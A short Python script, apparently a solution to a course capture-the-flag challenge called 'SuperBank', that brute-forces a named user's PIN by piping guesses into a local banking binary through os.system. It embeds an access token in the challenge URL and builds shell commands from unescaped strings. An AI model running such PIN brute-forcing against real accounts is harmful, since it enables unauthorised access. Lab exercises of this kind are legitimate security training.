import os


endpoint = "https://cyber210.network/api/challenges/SuperBank?token=Reed_Chip.HSZDHhboW1_HZzkkKJWjB-yUhfE"
user = "Heiner Bernadino"
pin = ""
scope = range(1536,1540)

for i in scope:
    try:    
        response = os.system('(echo "{}"; echo {}; echo "3") | ./superbank-linux https://cyber210.network/api/challenges/SuperBank?token=Reed_Chip.HSZDHhboW1_HZzkkKJWjB-yUhfE'.format(user,str(i)))
        print(str(i))

    except:
        print("nope")

